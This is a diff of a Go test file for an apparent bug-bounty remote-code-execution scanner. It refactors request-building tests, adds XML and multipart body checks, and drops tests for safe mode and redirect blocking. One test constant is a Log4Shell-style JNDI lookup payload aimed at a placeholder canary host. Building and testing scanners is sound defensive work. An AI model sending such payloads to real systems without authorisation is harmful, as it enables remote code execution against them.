@@ -1,16 +1,13 @@
-package engine
+package engine_test
 
 import (
 	"context"
 	"io"
-	"net/http"
 	"net/url"
-	"strings"
 	"testing"
-	"time"
 
-	"github.com/bugbountytool/rce-finder/internal/oob"
-	"github.com/bugbountytool/rce-finder/internal/scope"
+	"github.com/bugbountytool/rce-finder/internal/engine"
+	"github.com/bugbountytool/rce-finder/internal/requestbody"
 	"github.com/bugbountytool/rce-finder/internal/template"
 )
 
@@ -23,7 +20,7 @@ func TestBuildRequestPlacesPayloadInHeadersQueryAndBody(t *testing.T) {
 		},
 	}
 	const payload = "${jndi:ldap://canary.test/a}"
-	req, err := buildRequest(context.Background(), target, tmpl, payload)
+	req, err := engine.BuildRequest(context.Background(), target, tmpl, payload, requestbody.MaxBytes)
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -42,7 +39,7 @@ func TestBuildRequestPlacesPayloadInHeadersQueryAndBody(t *testing.T) {
 func TestBuildRequestPlacesPayloadInPath(t *testing.T) {
 	target, _ := url.Parse("https://example.test/api")
 	tmpl := &template.Template{PathTemplate: "v1/{{inject}}", InjectionPoints: []template.InjectionPoint{{Location: "path"}}}
-	req, err := buildRequest(context.Background(), target, tmpl, "canary.test")
+	req, err := engine.BuildRequest(context.Background(), target, tmpl, "canary.test", requestbody.MaxBytes)
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -54,7 +51,7 @@ func TestBuildRequestPlacesPayloadInPath(t *testing.T) {
 func TestBuildRequestPlacesPayloadInJSONBody(t *testing.T) {
 	target, _ := url.Parse("https://example.test/api")
 	tmpl := &template.Template{Method: "POST", BodyContentType: "application/json", InjectionPoints: []template.InjectionPoint{{Location: "body", Name: "input"}}}
-	req, err := buildRequest(context.Background(), target, tmpl, "canary.test")
+	req, err := engine.BuildRequest(context.Background(), target, tmpl, "canary.test", requestbody.MaxBytes)
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -64,68 +61,25 @@ func TestBuildRequestPlacesPayloadInJSONBody(t *testing.T) {
 	}
 }
 
-type staticOOB struct{ protocol string }
-
-func (s staticOOB) Issue(context.Context, string) (string, error) { return "canary.test", nil }
-func (s staticOOB) Poll(_ context.Context, probeID string) (*oob.Interaction, error) {
-	return &oob.Interaction{ProbeID: probeID, Protocol: s.protocol}, nil
-}
-func (s staticOOB) Close() error { return nil }
-
-type roundTripperFunc func(*http.Request) (*http.Response, error)
-
-func (f roundTripperFunc) RoundTrip(r *http.Request) (*http.Response, error) { return f(r) }
-
-func TestRunOneRequiresMatchingOOBProtocol(t *testing.T) {
-	target, _ := url.Parse("http://example.test")
-	tmpl := &template.Template{ID: "t", Name: "t", Severity: template.SeverityHigh, OOBProtocol: "dns", Method: "GET", TimeoutSeconds: 1, PayloadTemplate: "{{canary}}", InjectionPoints: []template.InjectionPoint{{Location: "query", Name: "q"}}}
-	eng := New(staticOOB{protocol: "http"}, Options{HTTPTimeout: time.Second, RequestsPerSec: 100})
-	eng.client = &http.Client{Transport: roundTripperFunc(func(*http.Request) (*http.Response, error) {
-		return &http.Response{StatusCode: http.StatusOK, Body: io.NopCloser(strings.NewReader(""))}, nil
-	})}
-	result := eng.runOne(context.Background(), job{target: scope.Target{Raw: target.String(), URL: target}, tmpl: tmpl})
-	if result.Status != StatusNotVulnerable || !strings.Contains(result.Detail, "no OOB callback") {
-		t.Fatalf("mismatched protocol result = %#v", result)
+func TestBuildRequestTypedBodyGolden(t *testing.T) {
+	target, _ := url.Parse("https://example.test/api")
+	xmlTemplate := &template.Template{Method: "POST", BodyContentType: "application/xml", BodyFields: []requestbody.Field{{Name: "request.input"}}, InjectionPoints: []template.InjectionPoint{{Location: "body", Name: "request.input"}}}
+	req, err := engine.BuildRequest(context.Background(), target, xmlTemplate, "canary<&", requestbody.MaxBytes)
+	if err != nil {
+		t.Fatal(err)
 	}
-}
-
-func TestRunOneConfirmsMatchingOOBCallback(t *testing.T) {
-	target, _ := url.Parse("http://example.test")
-	tmpl := &template.Template{ID: "t", Name: "t", Severity: template.SeverityHigh, OOBProtocol: "dns", Method: "GET", TimeoutSeconds: 1, PayloadTemplate: "{{canary}}", InjectionPoints: []template.InjectionPoint{{Location: "query", Name: "q"}}}
-	eng := New(staticOOB{protocol: "dns"}, Options{HTTPTimeout: time.Second, RequestsPerSec: 100})
-	eng.client = &http.Client{Transport: roundTripperFunc(func(*http.Request) (*http.Response, error) {
-		return &http.Response{StatusCode: http.StatusOK, Body: io.NopCloser(strings.NewReader(""))}, nil
-	})}
-	result := eng.runOne(context.Background(), job{target: scope.Target{Raw: target.String(), URL: target}, tmpl: tmpl})
-	if result.Status != StatusConfirmed {
-		t.Fatalf("matching callback result = %#v, want CONFIRMED", result)
+	body, _ := io.ReadAll(req.Body)
+	if req.Header.Get("Content-Type") != "application/xml" || string(body) != "<request><input>canary&lt;&amp;</input></request>" {
+		t.Fatalf("XML request = %q %q", req.Header.Get("Content-Type"), body)
 	}
-}
-
-func TestRunOneSkipsAdvancedTemplateInSafeMode(t *testing.T) {
-	target, _ := url.Parse("http://example.test")
-	tmpl := &template.Template{ID: "t", Name: "t", Severity: template.SeverityHigh, OOBProtocol: "dns", Mode: "advanced-authorized", PayloadTemplate: "{{canary}}", InjectionPoints: []template.InjectionPoint{{Location: "query", Name: "q"}}}
-	eng := New(staticOOB{protocol: "dns"}, DefaultOptions())
-	result := eng.runOne(context.Background(), job{target: scope.Target{Raw: target.String(), URL: target}, tmpl: tmpl})
-	if result.Status != StatusSkipped {
-		t.Fatalf("advanced template result = %#v, want SKIPPED", result)
+	multipartTemplate := &template.Template{Method: "POST", BodyContentType: "multipart/form-data", MultipartBoundary: "rce-finder-test", BodyFields: []requestbody.Field{{Name: "input"}}, InjectionPoints: []template.InjectionPoint{{Location: "body", Name: "input"}}}
+	req, err = engine.BuildRequest(context.Background(), target, multipartTemplate, "canary.test", requestbody.MaxBytes)
+	if err != nil {
+		t.Fatal(err)
 	}
-}
-
-func TestRunOneBlocksRedirectRatherThanFollowingIt(t *testing.T) {
-	target, _ := url.Parse("http://example.test")
-	tmpl := &template.Template{ID: "t", Name: "t", Severity: template.SeverityHigh, OOBProtocol: "dns", PayloadTemplate: "{{canary}}", InjectionPoints: []template.InjectionPoint{{Location: "query", Name: "q"}}}
-	eng := New(staticOOB{protocol: "dns"}, DefaultOptions())
-	eng.client = &http.Client{
-		CheckRedirect: func(*http.Request, []*http.Request) error { return http.ErrUseLastResponse },
-		Transport: roundTripperFunc(func(*http.Request) (*http.Response, error) {
-			h := make(http.Header)
-			h.Set("Location", "https://outside-scope.test")
-			return &http.Response{StatusCode: http.StatusFound, Header: h, Body: io.NopCloser(strings.NewReader(""))}, nil
-		}),
-	}
-	result := eng.runOne(context.Background(), job{target: scope.Target{Raw: target.String(), URL: target}, tmpl: tmpl})
-	if result.Status != StatusBlocked || !strings.Contains(result.Detail, "not followed") {
-		t.Fatalf("redirect result = %#v", result)
+	body, _ = io.ReadAll(req.Body)
+	want := "--rce-finder-test\r\nContent-Disposition: form-data; name=\"input\"\r\n\r\ncanary.test\r\n--rce-finder-test--\r\n"
+	if req.Header.Get("Content-Type") != "multipart/form-data; boundary=rce-finder-test" || string(body) != want {
+		t.Fatalf("multipart request = %q %q", req.Header.Get("Content-Type"), body)
 	}
 }
